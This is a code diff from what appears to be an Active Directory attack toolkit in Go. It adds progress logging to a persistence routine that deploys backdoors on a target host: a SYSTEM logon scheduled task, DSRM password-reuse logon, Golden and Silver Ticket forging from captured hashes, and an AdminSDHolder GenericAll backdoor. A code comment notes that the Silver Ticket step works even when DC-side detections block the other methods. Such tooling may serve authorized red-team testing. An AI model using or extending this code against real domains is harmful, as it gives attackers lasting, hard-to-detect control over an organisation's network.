@@ -51,20 +51,38 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 	ctx := context.Background()
 	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
 
+	utils.Section("⚓", "Persistence", "backdoor and persistence mechanism deployment")
+
 	deployed := 0
 
+	utils.Attempt("⏰", host.IP, "Scheduled Task on Logon (SYSTEM)")
 	if deployScheduledTask(ctx, exec, host, result) {
+		utils.StepOk("Scheduled task created (onlogon, SYSTEM)")
 		deployed++
+	} else {
+		utils.StepWarn("Scheduled task creation failed or skipped")
 	}
+	utils.Attempt("🔑", host.IP, "DSRM password-reuse logon (registry)")
 	if deployDSRM(ctx, exec, host, result) {
+		utils.StepOk("DSRM logon behavior set to 2 (password-reuse enabled)")
 		deployed++
+	} else {
+		utils.StepWarn("DSRM configuration failed or skipped")
 	}
 	if host.IsDC {
+		utils.Attempt("🪙", host.IP, "Golden Ticket (krbtgt hash + ticketer)")
 		if deployGoldenTicket(host, domain, user, pass, hash, result, state) {
+			utils.StepOk("Golden Ticket forged")
 			deployed++
+		} else {
+			utils.StepWarn("Golden Ticket forging failed")
 		}
+		utils.Attempt("🛡️", host.IP, "AdminSDHolder GenericAll backdoor")
 		if deployAdminSDHolder(host, domain, user, pass, hash, result) {
+			utils.StepOk("AdminSDHolder GenericAll granted")
 			deployed++
+		} else {
+			utils.StepWarn("AdminSDHolder backdoor failed")
 		}
 		flagSkeletonKeyOpportunity(host, result)
 	} else {
@@ -75,14 +93,20 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 	// previously captured service account hash and the domain SID. Crucially
 	// it bypasses the KDC entirely so it works even when AdminSDHolder /
 	// Golden Ticket are blocked by DC-side detections.
+	utils.Attempt("🥈", host.IP, "Silver Ticket(s) from service hashes")
 	if n := deploySilverTickets(state, host, domain, user, pass, hash, result); n > 0 {
+		utils.StepOk(fmt.Sprintf("%d Silver Ticket(s) forged", n))
 		deployed += n
+	} else {
+		utils.StepWarn("Silver Ticket forging returned no tickets")
 	}
 
 	if deployed == 0 {
+		utils.StepWarn("No persistence mechanisms deployed")
 		slog.Warn("No persistence mechanisms deployed")
 		result.Success = false
 	} else {
+		utils.StepOk(fmt.Sprintf("%d persistence mechanism(s) deployed", deployed))
 		slog.Info("Persistence mechanism(s) deployed", "count", deployed)
 	}
 	return result
